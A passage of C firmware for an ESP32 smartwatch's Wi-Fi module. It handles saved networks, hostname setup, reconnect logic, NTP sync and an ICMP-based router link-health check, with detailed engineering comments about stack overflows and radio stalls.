        persist_saved();
    }
    ESP_LOGI(TAG, "saved networks: %d", s_sv_cnt);
}

/* Remembers a network, or updates its passphrase if already known. Evicts the oldest entry if the list is full. */
static void upsert_saved(const char *ssid, const char *pass)
{
    if (ssid == NULL || ssid[0] == '\0') {
        return;
    }
    for (int i = 0; i < s_sv_cnt; i++) {
        if (strcmp(s_sv_ssid[i], ssid) == 0) {
            snprintf(s_sv_pass[i], sizeof s_sv_pass[i], "%s", pass ? pass : "");
            persist_saved();
            return;
        }
    }
    int slot;
    if (s_sv_cnt < WIFI_MAX_SAVED) {
        slot = s_sv_cnt++;
    } else {                                   /* the list is full: drop the oldest entry (slot 0) and shift everything down */
        for (int j = 0; j < WIFI_MAX_SAVED - 1; j++) {
            memcpy(s_sv_ssid[j], s_sv_ssid[j + 1], sizeof s_sv_ssid[j]);
            memcpy(s_sv_pass[j], s_sv_pass[j + 1], sizeof s_sv_pass[j]);
        }
        places_drop_ssid(s_sv_ssid[WIFI_MAX_SAVED - 1]);    /* the evicted profile takes its places with it */
        slot = WIFI_MAX_SAVED - 1;
    }
    snprintf(s_sv_ssid[slot], sizeof s_sv_ssid[slot], "%s", ssid);
    snprintf(s_sv_pass[slot], sizeof s_sv_pass[slot], "%s", pass ? pass : "");
    persist_saved();
    ESP_LOGI(TAG, "remembered \"%s\" (saved=%d)", ssid, s_sv_cnt);
}

static void remove_saved(const char *ssid)
{
    for (int i = 0; i < s_sv_cnt; i++) {
        if (strcmp(s_sv_ssid[i], ssid) == 0) {
            for (int j = i; j < s_sv_cnt - 1; j++) {
                memcpy(s_sv_ssid[j], s_sv_ssid[j + 1], sizeof s_sv_ssid[j]);
                memcpy(s_sv_pass[j], s_sv_pass[j + 1], sizeof s_sv_pass[j]);
            }
            s_sv_cnt--;
            persist_saved();
            places_drop_ssid(ssid);                          /* section 4.6 P3: its learned places go too */
            return;
        }
    }
}

/* ---- MAC address helpers ---- */
static void format_mac(char *dst, size_t len, const uint8_t m[6])
{
    snprintf(dst, len, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}
/* Reads the driver's current station MAC and publishes it for the UI; only valid after set_mode(STA). */
static void publish_current_mac(void)
{
    uint8_t m[6];
    if (esp_wifi_get_mac(WIFI_IF_STA, m) == ESP_OK) {
        char s[18];
        format_mac(s, sizeof s, m);
        publish_mac_str(s);
    }
}

/* ---- hostname: how the watch appears on the network ---- */
/* Turns the friendly device name into a roughly RFC-1123-compliant
 * hostname: keeps [A-Za-z0-9], collapses runs of space/underscore/other
 * characters into a single '-', and trims any leading or trailing '-'.
 * Falls back to the default if nothing usable survives. `out` is always
 * left NUL-terminated. */
static void sanitize_hostname(const char *in, char *out, size_t outlen)
{
    size_t j = 0;
    for (size_t i = 0; in && in[i] && j + 1 < outlen; i++) {
        char c = in[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')) {
            out[j++] = c;
        } else if (j > 0 && out[j - 1] != '-') {   /* collapses separator runs down to a single '-' */
            out[j++] = '-';
        }
    }
    while (j > 0 && out[j - 1] == '-') {            /* avoid a trailing hyphen */
        j--;
    }
    out[j] = '\0';
    if (j == 0) {
        snprintf(out, outlen, "NocSif-watch");
    }
}

/* Pushes the sanitized device name onto the STA netif as its DHCP/mDNS
 * hostname; a no-op until the netif actually exists, applied at the end of
 * bring_up and again whenever the device is renamed. */
static void apply_hostname(void)
{
    if (s_netif == NULL) {
        return;
    }
    char host[WIFI_SSID_MAX];
    sanitize_hostname(nocsif_settings_device_name(), host, sizeof host);
    esp_err_t e = esp_netif_set_hostname(s_netif, host);
    if (e != ESP_OK) {
        ESP_LOGW(TAG, "set_hostname('%s'): %s", host, esp_err_to_name(e));
    } else {
        ESP_LOGI(TAG, "hostname = \"%s\"", host);
    }
}

/* ---- connection reason helper ---- */
/* A drop that looks like a bad passphrase: stop retrying and tell the
 * user, rather than burning WIFI_MAX_RETRY association attempts on
 * credentials that will never actually work. */
static bool reason_is_auth(uint8_t reason)
{
    switch (reason) {
        case WIFI_REASON_AUTH_FAIL:
        case WIFI_REASON_4WAY_HANDSHAKE_TIMEOUT:
        case WIFI_REASON_MIC_FAILURE:
        case WIFI_REASON_HANDSHAKE_TIMEOUT:
        case WIFI_REASON_AUTH_EXPIRE:
            return true;
        default:
            return false;
    }
}

/* ---- event handlers, running on the system event task ---- */
static void try_connect(void)          /* connect only if a link is wanted and the STA is up */
{
    if (s_want_connect && s_sta_started) {
        esp_err_t e = esp_wifi_connect();
        if (e != ESP_OK) {
            ESP_LOGW(TAG, "esp_wifi_connect: %s", esp_err_to_name(e));
        }
    }
}

static void start_scan_now(void)
{
    s_scanning = true;
    refresh_strings();
    esp_err_t e = esp_wifi_scan_start(NULL, false);   /* the default active scan, non-blocking */
    if (e != ESP_OK) {
        ESP_LOGW(TAG, "scan_start: %s", esp_err_to_name(e));
        s_scanning = false;
        publish_status("err");
        publish_detail("Scan failed to start.");
    }
}

/* Event-task -> worker hand-off. The default event loop is asynchronous, so a short bounded wait
 * here is harmless, and it beats dropping a link transition (a dropped CMD_LINK_LOST would strand
 * the join state at "Joining"). The 6-deep queue has never been seen full at one of these; a false
 * return is the caller's cue to degrade, never to do the work inline. */
static bool post_from_event(const wifi_cmd_t *c)
{
    return s_q != NULL && xQueueSend(s_q, c, pdMS_TO_TICKS(50)) == pdTRUE;
}

/* Worker half of WIFI_EVENT_STA_DISCONNECTED (CMD_LINK_LOST, reason in arg): the auth-fail /
 * retry / give-up decision with its logs, reconnect and string rebuilds. Runs a few ms after the
 * event; STA_STOP may have landed in between (a mode switch, or esp_wifi_stop() from the reboot
 * shutdown handler), so the reconnect is gated on s_sta_started. */
static int64_t s_lh_last_heal_us;          /* link check: when it last re-joined the station (defined with the check below) */
static void do_link_lost(uint8_t reason)
{
    if (!s_want_connect) {                 /* a deliberate disconnect — don't retry */
        refresh_strings();
        return;
    }
    /* The link check re-joins a network whose credentials worked a moment ago (it only acts once the router has
     * answered on this association). A handshake timeout in the next minute is the radio still wedged — measured
     * 2026-10-12: run 2 of a viewing soak re-joined into a dead TX path, "auth failure; not retrying", and the
     * station stayed unassociated for 20+ minutes. Retry through it like any other drop. */
    const bool healing = s_lh_last_heal_us != 0 && esp_timer_get_time() - s_lh_last_heal_us < 90 * 1000000LL;
    if (reason_is_auth(reason) && !(healing && s_retry < WIFI_MAX_RETRY)) {   /* fail fast: creds almost certainly wrong */
        ESP_LOGW(TAG, "disconnect reason=%u -> auth failure; not retrying", reason);
        s_auth_fail = true;
        s_want_connect = false;
        s_join_state = NOCSIF_WIFI_JOIN_FAILED;
        if (s_autojoin_direct) { s_autojoin_direct = false; s_autojoin_direct_failed = true; }
        refresh_strings();
        return;
    }
    if (s_retry < WIFI_MAX_RETRY) {
        s_retry++;
        ESP_LOGW(TAG, "disconnect reason=%u; reconnect %d/%d", reason, s_retry, WIFI_MAX_RETRY);
        if (s_sta_started) {
            esp_wifi_connect();
        }
        return;
    }
    ESP_LOGW(TAG, "disconnect reason=%u; giving up after %d tries", reason, s_retry);
    s_want_connect = false;
    s_join_state = NOCSIF_WIFI_JOIN_FAILED;
    if (s_autojoin_direct) {               /* the last-linked network really is out of reach this time: the
                                              next re-look (Governor GOV_RELOOK_S) may take the weak pick */
        s_autojoin_direct = false;
        s_autojoin_direct_failed = true;
    }
    publish_status("err");
    char line[80];
    snprintf(line, sizeof line, "Couldn't reach %.32s", s_ssid);
    publish_detail(line);
}

/* Runs on the esp_event default-loop task ("sys_evt", CONFIG_ESP_SYSTEM_EVENT_TASK_STACK_SIZE B —
 * 2304 by IDF default). That task also carries IDF's own wifi_default/esp_netif handlers (which log
 * "sta ip: ..." at got-IP), and every ESP_LOGx here costs the console vprintf PLUS the logbook tee's
 * 256 B line buffer + second vsnprintf (logbook.c lb_vprintf). The STA_DISCONNECTED case used to log
 * and reconnect inline — and it also fires from esp_wifi_stop() inside esp_restart()'s shutdown
 * handlers, where a baseline run overflowed the 2304 B stack on 3 of 7 reboots (CRASH RECORD panic
 * task=sys_evt). Rule for this function: flags and queue posts only; no printf, no NVS, no logs on
 * the paths a join or a reboot walks. */
static void on_wifi_evt(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    (void)arg; (void)base;
    switch (id) {
    case WIFI_EVENT_STA_START:
        s_sta_started = true;
        if (s_pending_scan) { s_pending_scan = false; start_scan_now(); }
        if (s_pending_monitor) { s_pending_monitor = false; enter_promiscuous(); }
        try_connect();
        break;

    case WIFI_EVENT_STA_STOP:
        s_sta_started = false;
        s_connected = false;
        break;

    case WIFI_EVENT_STA_DISCONNECTED: {
        const wifi_event_sta_disconnected_t *d = (const wifi_event_sta_disconnected_t *)data;
        s_connected = false;
        clear_netinfo();
        wifi_cmd_t c = { .type = CMD_LINK_LOST, .arg = d ? (int32_t)d->reason : 0 };
        if (!post_from_event(&c)) {
            /* Degrade honestly: no retry this time (the UI's Try Again re-posts a connect). */
            s_want_connect = false;
            s_join_state = NOCSIF_WIFI_JOIN_FAILED;
        }
        break;
    }

    case WIFI_EVENT_SCAN_DONE:
        /* Retrieve the scan records on the worker task, off the event task, not here. */
        if (s_q) { wifi_cmd_t c = { .type = CMD_SCAN_DONE }; xQueueSend(s_q, &c, 0); }
        break;

    /* Software AP (M5-P5.3): the ap_tick timer is the single writer of the
     * client snapshot; these events just log the join/leave so a serial trace
     * shows them promptly, while the actual list follows within one refresh
     * tick. */
    case WIFI_EVENT_AP_STACONNECTED: {
        wifi_event_ap_staconnected_t *e = (wifi_event_ap_staconnected_t *)data;
        if (e) {
            ESP_LOGI(TAG, "AP client joined %02x:%02x:%02x:%02x:%02x:%02x (aid %d)",
                     e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], e->aid);
        }
        break;
    }
    case WIFI_EVENT_AP_STADISCONNECTED: {
        wifi_event_ap_stadisconnected_t *e = (wifi_event_ap_stadisconnected_t *)data;
        if (e) {
            ESP_LOGI(TAG, "AP client left  %02x:%02x:%02x:%02x:%02x:%02x (aid %d)",
                     e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], e->aid);
        }
        break;
    }

    default:
        break;
    }
}

/* Worker half of the got-IP event (CMD_GOT_IP, posted by on_ip_evt below): the address strings, the
 * log line, credential persistence (two NVS write+commit chains = flash ops) and the join-state flip,
 * all on the worker's own 4 KB stack. Runs a few ms after the event. A disconnect that raced in
 * between already cleared the netinfo on the event task, so bail rather than republish a dead lease —
 * the reconnect's got-IP will post again. */
/* SNTP sync callback (runs on the SNTP task): esp_sntp has already applied the system clock (UTC) via
 * settimeofday — bump the generation so the UI refreshes the PCF RTC. */
static void on_ntp_synced(struct timeval *tv)
{
    s_ntp_gen++;
    ESP_LOGI(TAG, "NTP: system clock set (epoch %lld)", (long long)tv->tv_sec);
}

/* Start (or re-poll) NTP once the STA has an IP. Sets the system clock in the background; WireGuard's
 * handshake timestamp (gettimeofday) + TLS depend on it, and the UI mirrors it to the RTC. */
static void start_time_sync(void)
{
    if (s_sntp_started) { esp_sntp_restart(); return; }   /* fresh link -> re-poll now */
    esp_sntp_setoperatingmode(SNTP_OPMODE_POLL);
    esp_sntp_setservername(0, "pool.ntp.org");
    sntp_set_time_sync_notification_cb(on_ntp_synced);
    esp_sntp_init();
    s_sntp_started = true;
    ESP_LOGI(TAG, "NTP: sync started (pool.ntp.org)");
}

/* ---- link check: a linked station whose data path died ------------------------------------------- *
 * 2026-10-11, LAN mirror sweep at 4 fps on the lean profile: the station stayed "linked" — beacons kept
 * arriving, no disconnect event — while nothing went in or out for 6+ minutes (the PC's pings 70 % lost
 * with ARP flapping, the watch's own DNS timed out; share off/on did not help). A Disconnect + Connect
 * fixed it at once. The driver never reports that state, so the worker checks the data path itself: an
 * ICMP echo to the router every LH_PERIOD_*; once the router has answered on this association, LH_MISS_MAX
 * misses in a row (LH_FAST_US apart) log the driver's statistics and re-join. A router that never answers
 * ping is left alone (no false re-joins), and re-joins are at least LH_HEAL_GAP_US apart. The socket only
 * exists while an echo is out (a few s per period), so it costs no resident socket or internal RAM.
 *
 * Traffic is proof of life. First owner test (phone on the hotspot streaming video at 1.9-2.9 Mbit/s): the
 * echo replies queued behind the video on the slow uplink for > 2 s, three "misses" in a row re-joined a
 * perfectly live link and kicked the phone off the hotspot. So the station interface's input is counted
 * (unicast frames only — LAN broadcast chatter arrives even when we cannot transmit), an echo gets
 * LH_TIMEOUT_US, and a late echo while >= LH_ALIVE_RX unicast frames came in over that window is not a
 * miss: a TCP/QUIC download cannot keep arriving unless our acknowledgements are getting out. */
#define LH_ID              0x4E53                 /* "NS": our echo identifier                              */
#define LH_FIRST_US        (5 * 1000000LL)        /* first echo after got-IP                                */
#define LH_PERIOD_BUSY_US  (30 * 1000000LL)       /* hotspot or web surface up: someone depends on the link */
#define LH_PERIOD_IDLE_US  (120 * 1000000LL)
#define LH_FAST_US         (2 * 1000000LL)        /* after a miss, or when a consumer saw a stall (kick)    */
#define LH_KICK_TIMEOUT_US (1500000LL)            /* a KICKED check (a viewer stalled): the data path is already suspect, so an  */
#define LH_KICK_GAP_US     (500000LL)             /* echo unanswered this long with ~nothing arriving is a miss, 0.5 s apart     */
#define LH_KICK_ALIVE_RX   8                      /* ... but >= 8 unicast frames in = traffic is flowing: back to the 5 s rule  */
#define LH_HEAL_GAP_DEAD_US (25 * 1000000LL)      /* re-join guard when nothing at all arrived during the misses (was 120 s)    */
#define LH_TIMEOUT_US      (5 * 1000000LL)        /* an echo unanswered this long is late                   */
#define LH_ALIVE_RX        40                     /* unicast frames in over one echo window = the link works */
#define LH_MISS_MAX        3
#define LH_NOANSWER_MAX    4                      /* a fresh link's router never answered: it ignores ping  */
#define LH_HEAL_GAP_US     (120 * 1000000LL)

/* Station input counter: wraps the STA lwIP netif's input hook (installed at got-IP, kept across links). */
static netif_input_fn    s_sta_input_orig;
static volatile uint32_t s_sta_rx_ucast;          /* unicast frames the station handed to lwIP since boot  */
static volatile uint64_t s_sta_rx_bytes;          /* their bytes — the Travel Router dashboard's download  */
static uint32_t          s_lh_rx_at_send;         /* s_sta_rx_ucast when the current echo went out          */
static uint32_t          s_lh_alive_by_rx;        /* late echoes forgiven because traffic was flowing       */

static err_t sta_input_count(struct pbuf *p, struct netif *inp)
{
    if (p && p->len > 0 && (((const uint8_t *)p->payload)[0] & 0x01) == 0) {
        s_sta_rx_ucast++;
        s_sta_rx_bytes += p->tot_len;
    }
    return s_sta_input_orig(p, inp);
}

static void sta_input_hook(void)
{
    struct netif *nif = s_netif ? (struct netif *)esp_netif_get_netif_impl(s_netif) : NULL;
    if (nif == NULL || nif->input == sta_input_count || nif->input == NULL) return;
    s_sta_input_orig = nif->input;
    __sync_synchronize();                         /* the original is visible before the wrapper can run */
    nif->input = sta_input_count;
}

static int           s_lh_sock = -1;              /* raw ICMP socket, open only while an echo is out        */
static uint32_t      s_lh_gw;                     /* router IPv4 (network order) of this association; 0 = none */
static uint16_t      s_lh_seq;
static int64_t       s_lh_sent_us, s_lh_next_us, s_lh_last_ok_us;
static bool          s_lh_pending, s_lh_answered, s_lh_off;
static int           s_lh_miss, s_lh_unanswered;
static bool          s_lh_fast;                   /* the chain in progress was started by a kick                */
static bool          s_lh_dead;                   /* every miss in this chain saw (almost) no unicast frame in  */
static volatile bool s_lh_kick;
static uint32_t      s_lh_heals, s_lh_probes, s_lh_rtt_ms;

static void lh_close(void)
{
    if (s_lh_sock >= 0) { close(s_lh_sock); s_lh_sock = -1; }
    s_lh_pending = false;
}

/* The router of the network that last answered our echo. A re-join onto the same network keeps watching it:
 * owner test 2026-10-11 — the radio was still wedged right after a re-join, the fresh link's first echoes went
 * unanswered, and the check concluded "this router ignores ping" and switched itself off for good. */
static uint32_t s_lh_known_gw;
static char     s_lh_known_ssid[WIFI_SSID_MAX];

static void lh_reset(uint32_t gw)
{
    sta_input_hook();
    lh_close();
    s_lh_gw = gw;
    s_lh_answered = (gw != 0 && gw == s_lh_known_gw && strcmp(s_ssid, s_lh_known_ssid) == 0);
    s_lh_off = false;
    s_lh_miss = s_lh_unanswered = 0;
    s_lh_next_us = esp_timer_get_time() + LH_FIRST_US;
}

static uint16_t lh_cksum(const uint8_t *p, int len)
{
    uint32_t sum = 0;
    for (; len > 1; p += 2, len -= 2) sum += (uint32_t)((p[0] << 8) | p[1]);
    if (len == 1) sum += (uint32_t)(p[0] << 8);
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum & 0xFFFF);
}

static void lh_send(int64_t now)
{
    s_lh_pending = true;                          /* a failed send is a miss once it times out */
    s_lh_sent_us = now;
    s_lh_rx_at_send = s_sta_rx_ucast;
    s_lh_probes++;
    s_lh_seq++;
    if (s_lh_sock < 0) s_lh_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s_lh_sock < 0) return;
    uint8_t pkt[16] = { 8, 0, 0, 0, LH_ID >> 8, LH_ID & 0xFF, (uint8_t)(s_lh_seq >> 8), (uint8_t)s_lh_seq,
                        'n', 'o', 'c', 's', 'i', 'f', 0, 0 };
    const uint16_t ck = lh_cksum(pkt, sizeof pkt);
    pkt[2] = (uint8_t)(ck >> 8); pkt[3] = (uint8_t)ck;
    struct sockaddr_in dst = { .sin_family = AF_INET };
    dst.sin_addr.s_addr = s_lh_gw;
    sendto(s_lh_sock, pkt, sizeof pkt, 0, (struct sockaddr *)&dst, sizeof dst);
}

/* True once our echo reply from the router is in the socket (non-blocking; other ICMP is skipped). */
static bool lh_drain(void)
{
    if (s_lh_sock < 0) return false;
    uint8_t in[64];
    for (int k = 0; k < 8; k++) {
        const int n = recv(s_lh_sock, in, sizeof in, MSG_DONTWAIT);
        if (n < 28) return false;
        const int ihl = (in[0] & 0x0F) * 4;
        if (ihl < 20 || n < ihl + 8) continue;
        const uint8_t *ic = in + ihl;
        uint32_t src;
        memcpy(&src, in + 12, 4);
        if (ic[0] == 0 && ((ic[4] << 8) | ic[5]) == LH_ID && ((ic[6] << 8) | ic[7]) == s_lh_seq && src == s_lh_gw) {
            return true;
        }
    }
    return false;
}

static void lh_heal(int64_t now)
{
    char gw[16];
    esp_ip4_addr_t a = { .addr = s_lh_gw };
    snprintf(gw, sizeof gw, IPSTR, IP2STR(&a));
    s_lh_miss = 0;
    const int64_t gap = s_lh_dead ? LH_HEAL_GAP_DEAD_US : LH_HEAL_GAP_US;   /* nothing arriving at all: the radio is dead, heal sooner */
    s_lh_fast = false;
    if (s_lh_last_heal_us && now - s_lh_last_heal_us < gap) {
        ESP_LOGW(TAG, "link check: router %s still silent; re-join held (the last one was %d s ago)", gw,
                 (int)((now - s_lh_last_heal_us) / 1000000));
        s_lh_next_us = now + LH_PERIOD_BUSY_US;
        return;
    }
    s_lh_last_heal_us = now;
    s_lh_heals++;
    ESP_LOGW(TAG, "link check: linked to \"%s\" but router %s silent for %d s (%d echoes) — driver statistics "
                  "follow, then re-joining (int-dma free %u largest %u)", s_ssid, gw,
             (int)((now - s_lh_last_ok_us) / 1000000), LH_MISS_MAX,
             (unsigned)nocsif_int_dma_free(), (unsigned)nocsif_int_dma_largest());
    esp_wifi_statis_dump(WIFI_STATIS_ALL);
    s_retry = 0;                                  /* a fresh retry budget for the re-join */
    esp_wifi_disconnect();                        /* s_want_connect stays set: do_link_lost re-connects */
}

/* Worker tick (at least once a second). */
static void link_health_tick(void)
{
    const int64_t now = esp_timer_get_time();
    if (!s_connected || s_lh_gw == 0 || s_lh_off) {
        if (s_lh_sock >= 0 || s_lh_pending) lh_close();
        if (!s_connected) s_lh_gw = 0;            /* the next got-IP re-arms it */
        return;
    }
    if (s_lh_pending) {
        const bool answered = lh_drain();
        const uint32_t rx_in = s_sta_rx_ucast - s_lh_rx_at_send;
        if (s_lh_fast && !answered && now - s_lh_sent_us >= LH_KICK_TIMEOUT_US && rx_in >= LH_KICK_ALIVE_RX) {
            s_lh_fast = false;                    /* frames are arriving: not the dead-radio signature — normal 5 s rule */
        }
        const bool late = !answered && now - s_lh_sent_us >= (s_lh_fast ? LH_KICK_TIMEOUT_US : LH_TIMEOUT_US);
        if (answered || (late && s_lh_answered && rx_in >= LH_ALIVE_RX)) {
            if (answered) s_lh_rtt_ms = (uint32_t)((now - s_lh_sent_us) / 1000);
            lh_close();
            if (!answered) {                      /* echo stuck behind real traffic: the link is alive */
                static int64_t s_last_note;
                s_lh_alive_by_rx++;
                if (now - s_last_note > 60 * 1000000LL) {
                    s_last_note = now;
                    ESP_LOGI(TAG, "link check: echo late under load (%u frames in) — link alive", (unsigned)rx_in);
                }
            } else if (!s_lh_answered) {
                ESP_LOGI(TAG, "link check: router answers ping (%u ms) — watching this link", (unsigned)s_lh_rtt_ms);
            } else if (s_lh_miss) {
                ESP_LOGI(TAG, "link check: router answered again after %d miss(es)", s_lh_miss);
            }
            if (answered) {
                s_lh_answered = true;
                s_lh_known_gw = s_lh_gw;
                snprintf(s_lh_known_ssid, sizeof s_lh_known_ssid, "%s", s_ssid);
            }
            s_lh_miss = s_lh_unanswered = 0;
            s_lh_fast = false;
            s_lh_last_ok_us = now;
            s_lh_kick = false;
            s_lh_next_us = now + ((s_comp_active || esp_netif_get_handle_from_ifkey("WIFI_AP_DEF")) ? LH_PERIOD_BUSY_US
                                                                                                     : LH_PERIOD_IDLE_US);
            return;
        }
        if (!late) return;
        lh_close();
        if (!s_lh_answered) {                     /* never answered on this link: maybe it just ignores ping */
            if (++s_lh_unanswered >= LH_NOANSWER_MAX) {
                s_lh_off = true;
                ESP_LOGI(TAG, "link check: this network's router does not answer ping — check off for this link");
            } else {
                s_lh_next_us = now + 5 * 1000000LL;
            }
            return;
        }
        if (s_lh_miss == 0) s_lh_dead = true;
        if (rx_in >= 3) s_lh_dead = false;
        s_lh_miss++;
        ESP_LOGW(TAG, "link check: no answer from the router (%d/%d, %u frames in%s)", s_lh_miss, LH_MISS_MAX,
                 (unsigned)rx_in, s_lh_fast ? ", fast" : "");
        if (s_lh_miss >= LH_MISS_MAX) { lh_heal(now); return; }
        s_lh_next_us = now + (s_lh_fast ? LH_KICK_GAP_US : LH_FAST_US);
        return;
    }
    if (s_lh_kick && s_lh_answered) {             /* a consumer saw a stall: check now, not at the next period */
        s_lh_kick = false;
        s_lh_fast = true;                         /* ... and judge it by the fast rule (a viewer already stalled) */
        if (s_lh_next_us > now) s_lh_next_us = now;
    }
    if (now >= s_lh_next_us) lh_send(now);
}

void nocsif_wifi_lean_tune_active(nocsif_wifi_lean_tune_t *out) { if (out) *out = s_lean_tune; }
void nocsif_wifi_router_tune_active(nocsif_wifi_router_tune_t *out) { if (out) *out = s_router_tune; }
void nocsif_wifi_router_tune_saved(nocsif_wifi_router_tune_t *out)  { if (out) *out = s_router_saved; }

void nocsif_wifi_router_tune_save(const nocsif_wifi_router_tune_t *t)
{
    if (!t) return;
    if (t->srx   >= 2 && t->srx   <= 12) { nocsif_settings_set_i32("tr_srx",   t->srx);   s_router_saved.srx   = t->srx; }
    if (t->stx   >= 2 && t->stx   <= 16) { nocsif_settings_set_i32("tr_stx",   t->stx);   s_router_saved.stx   = t->stx; }
    if (t->cache >= 4 && t->cache <= 32) { nocsif_settings_set_i32("tr_cache", t->cache); s_router_saved.cache = t->cache; }
    if (t->rxq   >= 2 && t->rxq   <= 64) { nocsif_settings_set_i32("tr_rxq",   t->rxq);   s_router_saved.rxq   = t->rxq; }
    if (t->ba    >= 0 && t->ba    <= 32) { nocsif_settings_set_i32("tr_ba",    t->ba);    s_router_saved.ba    = t->ba; }
    if (t->atx == 0 || t->atx == 1)      { nocsif_settings_set_i32("tr_atx",   t->atx);   s_router_saved.atx   = t->atx; }
    ESP_LOGW(TAG, "router Wi-Fi set saved (srx=%d stx=%d cache=%d rxq=%d ba=%d atx=%d; -1 = unchanged) — next boot",
             t->srx, t->stx, t->cache, t->rxq, t->ba, t->atx);
}

void nocsif_wifi_lean_tune_saved(nocsif_wifi_lean_tune_t *out) { if (out) *out = s_lean_saved; }

void nocsif_wifi_lean_tune_save(int srx, int stx, int rxq, int agg)
{
    if (srx >= 2 && srx <= 6)  { nocsif_settings_set_i32("wl_srx", srx); s_lean_saved.srx = srx; }
    if (stx >= 2 && stx <= 6)  { nocsif_settings_set_i32("wl_stx", stx); s_lean_saved.stx = stx; }
    if (rxq >= 2 && rxq <= 64) { nocsif_settings_set_i32("wl_rxq", rxq); s_lean_saved.rxq = rxq; }
    if (agg == 0 || agg == 1)  { nocsif_settings_set_i32("wl_agg", agg); s_lean_saved.agg = agg; }
    ESP_LOGW(TAG, "lean Wi-Fi set saved (srx=%d stx=%d rxq=%d agg=%d; -1 = unchanged) — applies at the next boot",
             srx, stx, rxq, agg);
}

void nocsif_wifi_link_check_kick(void) { s_lh_kick = true; }
uint64_t nocsif_wifi_sta_rx_bytes(void) { return s_sta_rx_bytes; }

bool nocsif_wifi_sta_diag(int *rssi, int *channel, bool dump)
{
    wifi_ap_record_t ap;
    const bool ok = s_driver_up && esp_wifi_sta_get_ap_info(&ap) == ESP_OK;
    if (rssi)    *rssi    = ok ? ap.rssi : 0;
    if (channel) *channel = ok ? ap.primary : 0;
    if (dump && s_driver_up) esp_wifi_statis_dump(WIFI_STATIS_ALL);
    return ok;
}

void nocsif_wifi_link_check_stats(nocsif_wifi_link_check_t *o)
{
    if (!o) return;
    o->watching = s_lh_answered && !s_lh_off && s_lh_gw != 0;
    o->off      = s_lh_off;
    o->miss     = (uint32_t)s_lh_miss;
    o->rtt_ms   = s_lh_rtt_ms;
    o->probes   = s_lh_probes;
    o->heals    = s_lh_heals;
    o->alive_by_rx = s_lh_alive_by_rx;
    o->rx_ucast = s_sta_rx_ucast;
}

static void do_got_ip(const esp_netif_ip_info_t *info)
{
    if (!s_connected) {
        ESP_LOGW(TAG, "got-IP arrived after the link dropped; ignored (a reconnect re-posts it)");
        return;
    }
    char ip[16], nm[16], gw[16];
    snprintf(ip, sizeof ip, IPSTR, IP2STR(&info->ip));
    snprintf(nm, sizeof nm, IPSTR, IP2STR(&info->netmask));
    snprintf(gw, sizeof gw, IPSTR, IP2STR(&info->gw));
    publish_ip(ip);
    publish_netmask(nm);
    publish_gw(gw);
    ESP_LOGI(TAG, "got IP %s on \"%s\"", ip, s_ssid);
    lh_reset(info->gw.addr);                /* link check: watch this association's router */
    s_autojoin_direct = false;              /* linked: forget the pick's direct-try bookkeeping */
    s_autojoin_direct_failed = false;
    persist_creds();                        /* only known-good creds reach NVS */
    upsert_saved(s_ssid, s_pass);           /* remember it for the saved-networks list */
    start_time_sync();                      /* NTP: set the system clock (WireGuard/TLS) + feed the RTC */
    refresh_strings();
    s_join_state = NOCSIF_WIFI_JOIN_CONNECTED;   /* last: "Done" only once the address + detail line are readable */
}

/* IP_EVENT_STA_GOT_IP runs on the esp_event default-loop task ("sys_evt"), whose stack is
 * CONFIG_ESP_SYSTEM_EVENT_TASK_STACK_SIZE — 2304 B by IDF default. Everything heavy that used to
 * happen here (three IPSTR snprintfs, an ESP_LOGI, persist_creds + upsert_saved = NVS writes with
 * commits, refresh_strings) overflowed that stack in ~2 of 7 boots: CRASH RECORD panic task=sys_evt,
 * vApplicationStackOverflowHook <- vTaskSwitchContext. This handler now only flips the link flags and
 * hands the lease to the worker; nothing here formats, logs or touches flash. Keep it that way. */
static void on_ip_evt(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    (void)arg; (void)base;
    if (id != IP_EVENT_STA_GOT_IP || data == NULL) {
        return;
    }
    const ip_event_got_ip_t *e = (const ip_event_got_ip_t *)data;
    s_connected = true;
    s_retry = 0;
    s_auth_fail = false;
    wifi_cmd_t c = { .type = CMD_GOT_IP, .ip = e->ip_info };
    if (!post_from_event(&c)) {
        /* Never fall back to the heavy path here — that is the overflow. The link is up either
         * way; the UI shows "connected" without an address until the next lease. */
        s_join_state = NOCSIF_WIFI_JOIN_CONNECTED;
    }
}

/* ---- bring-up and started state ---- */
/* A lazy, one-time init: netif, the default event loop, esp_wifi_init,
 * and handler registration. NVS is already up by this point
 * (nocsif_settings_init runs at boot), which esp_wifi needs for its PHY
 * calibration data. */
static bool bring_up(void)
{
    if (s_driver_up) {
        return true;
    }

    /* Coexistence init-order guard (RAM-BUDGET.md remake #3, C1). The BLE
     * controller must claim its roughly 31.7 KB contiguous internal-DMA block
     * from the pristine boot pool before esp_wifi_init fragments it — once
     * released, a block this size can never be re-claimed after WiFi comes up
     * (measured). So if Bluetooth is enabled and we're not in safe mode,
     * nocsif_ble_boot_reserve must have already run. If it hasn't, the boot
     * init order regressed (WiFi came up first), and Bluetooth will stay
     * unavailable until reboot — a violation of constraint #1. Log this
     * loudly rather than silently continuing. */
    if (nocsif_ble_bt_enabled() && !nocsif_reliability_safe_mode() && !nocsif_ble_boot_reserve_ran()) {
        ESP_LOGE(TAG, "COEX INIT-ORDER BUG: esp_wifi_init is about to run but nocsif_ble_boot_reserve "
                      "has NOT run — the BLE controller block will be unreclaimable and Bluetooth will "
                      "need a reboot. Call nocsif_ble_boot_reserve() BEFORE any WiFi bring-up (main.c).");
    }

    esp_err_t e;

    e = esp_netif_init();
    if (e != ESP_OK) { ESP_LOGE(TAG, "esp_netif_init: %s", esp_err_to_name(e)); goto fail; }

    e = esp_event_loop_create_default();
    if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) {   /* INVALID_STATE just means it's already been created */
        ESP_LOGE(TAG, "event loop: %s", esp_err_to_name(e)); goto fail;
    }

    if (s_netif == NULL) {
        s_netif = esp_netif_create_default_wifi_sta();
        if (s_netif == NULL) { ESP_LOGE(TAG, "create_default_wifi_sta failed"); goto fail; }
    }

